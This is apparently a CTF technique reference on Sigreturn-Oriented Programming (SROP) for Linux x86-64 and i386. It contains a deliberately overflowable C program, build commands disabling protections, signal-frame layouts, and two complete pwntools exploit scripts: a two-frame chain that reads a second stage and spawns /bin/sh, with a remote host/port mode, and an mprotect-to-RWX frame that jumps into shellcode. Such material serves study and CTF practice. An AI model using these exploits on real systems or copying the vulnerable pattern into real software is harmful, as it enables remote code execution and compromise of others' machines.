---
title: "SROP - Sigreturn-Oriented Programming"
category: pwn
subcategory: rop
type: technique
tags: [srop, sigreturn, rt-sigreturn, sigcontext, ucontext, rop, syscall, execve, mprotect, static-binary, nx, aslr, vdso, vsyscall, shellcode, read, pwntools, ropgadget, checksec, pwndbg]
difficulty: medium
summary: "One syscall gadget plus rax=15 sets every register at once. The kernel restores a stack-controlled sigcontext, so a fake frame is a universal gadget."
when_to_use:
  - "The binary has a syscall instruction but almost no pop gadgets (no pop rdx, no pop rsi)"
  - "You need to control rax, rdx and rip simultaneously and cannot find the gadgets"
  - "Static binary, no libc to leak, and ROPgadget --ropchain did not solve it"
  - "You control a large amount of stack (the x86-64 frame is 248 bytes) and know a writable address"
  - "You want mprotect(page, len, RWX) followed by a jump to shellcode in one shot"
tools: [pwntools, ROPgadget, ropper, checksec, gdb, pwndbg, gef, objdump]
related: [rop-fundamentals, rop-static-binary, rop-ret2csu, rop-stack-pivot, shellcode-crafting, shellcode-ret2shellcode, shellcode-seccomp-orw, syscall-tables, pwntools-cheatsheet, rop-gadgets-cheatsheet]
---

## TL;DR

When a signal handler finishes, the kernel has to restore every register the handler clobbered.
It does that by reading a `sigcontext` structure straight off the user stack, with no
authentication whatsoever. Call `rt_sigreturn` yourself with a stack you control and the kernel
loads `rax`, `rdi`, `rsi`, `rdx`, `rsp` and `rip` from your bytes. One `syscall` gadget plus a way
to set `rax = 15` replaces an entire gadget catalogue.

## Recognise it

- `ROPgadget --binary ./vuln --only "syscall|ret"` finds a `syscall` but you cannot find
  `pop rdx ; ret` anywhere.
- Static binary with an otherwise sparse gadget set, or a tiny hand-written assembly challenge.
- A huge overflow: you control hundreds of bytes past the saved return address. The x86-64
  sigreturn frame is 248 bytes (0xF8) and the i386 one is about 80 bytes.
- The binary exposes `read(0, buf, n)` where you can make `n` exactly 15, giving `rax = 15` for
  free (`read` returns the byte count).
- `ROPgadget` finds `pop rax ; ret` or `mov eax, 0xf` somewhere -- that plus `syscall` is enough.
- Seccomp permits `rt_sigreturn` (it almost always does; it is on every default allowlist).

## Vulnerable source

```c
/* vuln.c - a big overflow with a deliberately tiny gadget budget */
#include <unistd.h>

void vuln(void) {
    char buf[32];
    write(1, "say something:\n", 15);
    read(0, buf, 0x400);          /* 1024 bytes into a 32 byte buffer */
}

int main(void) {
    vuln();
    return 0;
}
```

```sh
# static so there is a syscall instruction in the binary and no libc to leak
gcc -fno-stack-protector -no-pie -static -o vuln vuln.c

# the 32-bit twin, for the int 0x80 / eax=0x77 variant
gcc -fno-stack-protector -no-pie -static -m32 -o vuln32 vuln.c

checksec --file=./vuln
ROPgadget --binary ./vuln --only "syscall|ret" | head
ROPgadget --binary ./vuln --only "pop|ret" | grep -E "pop (rax|eax) ; ret"
```

## Theory

### What the kernel does on signal delivery

When a signal arrives, the kernel pushes a `struct rt_sigframe` onto the user stack: a return
trampoline pointer (`pretcode`), a `ucontext` holding a full `sigcontext` register snapshot, and
the `siginfo`. It then runs the handler. When the handler returns it lands on `pretcode`, which is
the *restorer* -- a two-instruction stub, in the vDSO or supplied by libc:

```
__restore_rt:   mov rax, 0xf      ; __NR_rt_sigreturn
                syscall
```

`sys_rt_sigreturn` then copies the `sigcontext` from `[rsp]` back into the task's register set and
returns to userspace. The kernel does not check that a signal was ever delivered, does not check
who wrote the frame, and does not checksum it. Any code that can execute `syscall` with `rax = 15`
and controls the memory at `rsp` gets a full register load.

### The x86-64 frame

Offsets are from `rsp` at the instant the `syscall` with `rax = 15` executes:

| Offset | Field | Offset | Field |
|---|---|---|---|
| `0x00` | `uc_flags` | `0x78` | `rbp` |
| `0x08` | `&uc` (`uc_link`) | `0x80` | `rbx` |
| `0x10` | `uc_stack.ss_sp` | `0x88` | `rdx` |
| `0x18` | `uc_stack.ss_flags` | `0x90` | `rax` |
| `0x20` | `uc_stack.ss_size` | `0x98` | `rcx` |
| `0x28` | `r8` | `0xA0` | **`rsp`** |
| `0x30` | `r9` | `0xA8` | **`rip`** |
| `0x38` | `r10` | `0xB0` | `eflags` |
| `0x40` | `r11` | `0xB8` | `cs` / `gs` / `fs` |
| `0x48` | `r12` | `0xC0` | `err` |
| `0x50` | `r13` | `0xC8` | `trapno` |
| `0x58` | `r14` | `0xD0` | `oldmask` |
| `0x60` | `r15` | `0xD8` | `cr2` |
| `0x68` | **`rdi`** | `0xE0` | `&fpstate` (leave 0) |
| `0x70` | **`rsi`** | `0xE8` | `__reserved` |

`cs` must be `0x33` (64-bit user code segment) and `ss` must be `0x2b`, or you get a general
protection fault on return to userspace. `&fpstate` must be `0` or a valid, aligned FPU state --
garbage there makes `restore_fpstate` fail and the kernel sends you `SIGSEGV`.
`SigreturnFrame()` fills all of this in for you.

### The i386 frame

i386 has two flavours. The classic `sigreturn` is syscall `119` (`0x77`); the POSIX
`rt_sigreturn` is `173` (`0xad`). Both are invoked with `int 0x80`. The `sigreturn` frame is
smaller and is what you normally forge, with offsets from `esp` at the `int 0x80`:

```
0x00 gs   0x04 fs   0x08 es   0x0c ds
0x10 edi  0x14 esi  0x18 ebp  0x1c esp
0x20 ebx  0x24 edx  0x28 ecx  0x2c eax
0x30 trapno  0x34 err  0x38 eip  0x3c cs
0x40 eflags  0x44 esp_at_signal  0x48 ss  0x4c fpstate
```

Set `eax = 0x77` before the `int 0x80`. The segment registers must be sane: `cs = 0x73`,
`ss = ds = es = 0x7b`, `gs`/`fs` may be `0`. Again, pwntools does this when
`context.arch = "i386"`.

### Chaining frames

The restored `rsp` and `rip` are the reason SROP composes. Point `rip` at a `syscall ; ret`
gadget and `rsp` at a region you also control: after the syscall in the restored context
completes, the `ret` pops the next address from your fake stack, and you are back in an ordinary
ROP chain with fresh registers. The canonical two-frame chain is:

1. Frame A: `read(0, bss, 0x400)` with `rip = syscall ; ret` and `rsp = bss`.
2. The `ret` after the read pops the first qword of what you just wrote into `.bss`.
3. Those bytes are `[pop rax][15][syscall ; ret][frame B]`, and frame B does
   `execve("/bin/sh", 0, 0)` using a `"/bin/sh"` you just wrote alongside it.

### Getting rax = 15

| Method | Notes |
|---|---|
| `pop rax ; ret` | The obvious one. `ROPgadget --only "pop\|ret" \| grep "pop rax"` |
| `read()` return value | `read` returns the byte count, so a 15-byte read leaves `rax = 15` |
| `mov eax, 0xf ; ret` | Sometimes present verbatim in static binaries |
| `xor rax, rax ; ret` + 15x `inc eax ; ret` | Ugly, but it works when nothing else does |
| `syscall` that returns 15 | `write(1, buf, 15)` also returns 15 |
| `__restore_rt` in libc | If you have libc, `libc.symbols['__restore_rt']` is the whole stub |

## Attack

1. Confirm a `syscall` (x86-64) or `int 0x80` (i386) exists. A trailing `ret` is strongly
   preferred so the chain can continue.
2. Find a way to set `rax = 15` / `eax = 0x77`.
3. Pick a writable staging address: `elf.bss() + 0x100` avoids stomping live data.
4. Build frame A to `read()` your second stage into that address, with `rsp` pointing there.
5. Build frame B for the real goal: `execve("/bin/sh", 0, 0)` (`rax = 59`) or
   `mprotect(page, 0x1000, 7)` (`rax = 10`) followed by shellcode.
6. Fire, and debug in gdb by breaking on the `syscall` gadget and dumping `$rsp` as 31 qwords.

## Exploit

```python
#!/usr/bin/env python3
"""
SROP on a static, no-PIE x86-64 binary: two sigreturn frames, read then execve.

Local:   ./exploit.py
Remote:  ./exploit.py HOST PORT
Build:   gcc -fno-stack-protector -no-pie -static -o vuln vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln"

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

OFFSET = 40  # 32 byte buffer + saved rbp; measure with cyclic()


def start():
    """Local process by default, remote when argv gives host/port."""
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="b *vuln+30\nc\n")
    return process(BINARY)


def find_gadgets(rop):
    """syscall;ret and pop rax;ret - the entire gadget budget SROP needs."""
    syscall_ret = rop.find_gadget(["syscall", "ret"])
    if syscall_ret is None:
        syscall_ret = next(elf.search(asm("syscall; ret")))
    else:
        syscall_ret = syscall_ret.address
    pop_rax = rop.find_gadget(["pop rax", "ret"])
    if pop_rax is None:
        pop_rax = next(elf.search(asm("pop rax; ret")))
    else:
        pop_rax = pop_rax.address
    log.success("syscall;ret = %#x   pop rax;ret = %#x", syscall_ret, pop_rax)
    return syscall_ret, pop_rax


def read_frame(syscall_ret, stage):
    """Frame A: read(0, stage, 0x400), then land on the fake stack at `stage`."""
    f = SigreturnFrame()
    f.rax = constants.SYS_read
    f.rdi = 0
    f.rsi = stage
    f.rdx = 0x400
    f.rip = syscall_ret
    f.rsp = stage          # the `ret` after the syscall pops stage[0]
    return f


def execve_frame(syscall_ret, binsh, scratch):
    """Frame B: execve("/bin/sh", NULL, NULL)."""
    f = SigreturnFrame()
    f.rax = constants.SYS_execve
    f.rdi = binsh
    f.rsi = 0
    f.rdx = 0
    f.rip = syscall_ret
    f.rsp = scratch
    return f


def main():
    rop = ROP(elf)
    syscall_ret, pop_rax = find_gadgets(rop)

    stage = elf.bss() + 0x400
    binsh = stage + 0x200
    scratch = stage + 0x300

    # Stage 1: lives on the real stack, triggers the first sigreturn.
    stage1 = flat(
        {
            OFFSET: [
                pop_rax,
                15,                       # __NR_rt_sigreturn
                syscall_ret,
                bytes(read_frame(syscall_ret, stage)),
            ]
        },
        filler=b"A",
    )

    # Stage 2: lives at `stage`, read in by frame A, executed by the trailing ret.
    stage2 = flat(
        pop_rax,
        15,
        syscall_ret,
        bytes(execve_frame(syscall_ret, binsh, scratch)),
    )
    stage2 = stage2.ljust(binsh - stage, b"\x00") + b"/bin/sh\x00"

    io = start()
    io.recvuntil(b"say something:")
    io.send(stage1)
    io.send(stage2.ljust(0x400, b"\x00"))
    io.interactive()


if __name__ == "__main__":
    main()
```

The mprotect-then-shellcode variant, when `execve` is blocked or you want a full shell payload:

```python
#!/usr/bin/env python3
"""SROP frame that makes a page RWX, then returns into shellcode placed there."""
from pwn import *

context.arch = "amd64"

PAGE = 0x404000          # a page-aligned writable address in the target
SYSCALL_RET = 0x4012A3   # syscall ; ret  (replace with ROPgadget output)


def mprotect_frame(page, shellcode_addr):
    f = SigreturnFrame()
    f.rax = constants.SYS_mprotect
    f.rdi = page                 # addr, must be page aligned
    f.rsi = 0x1000               # len
    f.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
    f.rip = SYSCALL_RET
    f.rsp = shellcode_addr       # the trailing ret jumps straight into shellcode
    return f


def main():
    sc = asm(shellcraft.amd64.linux.sh())
    frame = mprotect_frame(PAGE, PAGE + 0x100)

    blob = bytes(frame)
    blob = blob.ljust(0x100, b"\x00")
    # rsp = PAGE+0x100, so the ret pops PAGE+0x108: put the jump target there.
    blob += p64(PAGE + 0x108) + sc

    log.info("frame is %d bytes, shellcode is %d bytes", len(bytes(frame)), len(sc))
    print(hexdump(blob[:0x40]))


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **`cs` and `ss` matter.** A frame with `cs = 0` faults immediately on `iret`. Use
  `SigreturnFrame()` rather than hand-packing 31 qwords; it sets `cs = 0x33`, `ss = 0x2b`.
- **`&fpstate` must be 0.** Leftover stack garbage there sends the kernel into
  `restore_fpregs_from_user` and you get an opaque `SIGSEGV` after the syscall.
- **`rsp` must point at writable, mapped memory** even if the restored `rip` never pushes.
  A `push` or a `call` in the restored context on an unmapped `rsp` is an instant crash.
- **Frame size.** 248 bytes on x86-64 plus the `pop rax ; 15 ; syscall` preamble means you need
  roughly 280 bytes of overflow. If you only have 100, pivot first (`rop-stack-pivot`) or use
  `rop-ret2csu`.
- **`syscall` without `ret`.** A bare `syscall` still works for a one-shot `execve`, because you
  never come back. You just cannot chain frames off it -- set `rip` to the bare `syscall` and
  accept that the frame is terminal.
- **i386 number confusion.** `0x77` (119) is `sigreturn`; `0xad` (173) is `rt_sigreturn`. They
  consume *different* frame layouts. Match the number to the frame you built. pwntools picks
  correctly from `context.arch`.
- **vDSO and vsyscall.** The vDSO contains `__kernel_rt_sigreturn` and `syscall` bytes, but it is
  randomized, so you need a leak to use it. The legacy vsyscall page at
  `0xffffffffff600000` is at a *fixed* address on every x86-64 Linux, but modern kernels map it
  `vsyscall=xonly` or `vsyscall=none`: you may only *enter* at the three entry points
  (`0x...600000` gettimeofday, `0x...600400` time, `0x...600800` getcpu), never mid-instruction.
  Those entries still behave like a long `ret`-terminated function, which makes them useful
  padding for ret2csu-style chains -- but do not plan on finding a `syscall ; ret` gadget there.
- **seccomp.** `rt_sigreturn` survives nearly every filter, which is exactly why SROP is the
  standard way to set `rdx` inside a sandbox. But if the filter checks the *architecture* or uses
  `SECCOMP_RET_TRAP`, a restored `rax = 59` still gets caught. See `shellcode-seccomp-orw`.
- **ASLR.** SROP does not defeat ASLR by itself. You still need a fixed writable address, which
  in practice means No PIE, or a PIE leak first.
- **Signals actually arriving.** Some challenges call `sigaction` and expect a real signal.
  You do not need one -- SROP works on a process that has never received a signal in its life.
- **`uc_stack` is ignored** by the restore path, so those three qwords can be anything.

## Tools

| Tool | Use |
|---|---|
| `pwntools SigreturnFrame()` | Builds a correct frame for amd64/i386/arm/aarch64/mips |
| `bytes(frame)` / `flat(frame)` | Serialise the frame straight into a payload |
| `constants.SYS_execve` | Syscall numbers without memorising them; see `syscall-tables` |
| `ROPgadget --binary ./vuln --only "syscall\|ret"` | Find the one gadget you need |
| `ropper --file ./vuln --search "syscall"` | Same, with a different decoder |
| `checksec --file=./vuln` | Confirm No PIE so `.bss` is at a fixed address |
| `gdb` + `pwndbg` | `b *SYSCALL_RET`, then `x/31gx $rsp` to diff your frame against the table |
| `objdump -d ./vuln \| grep syscall` | Cheap syscall hunt in a static binary |
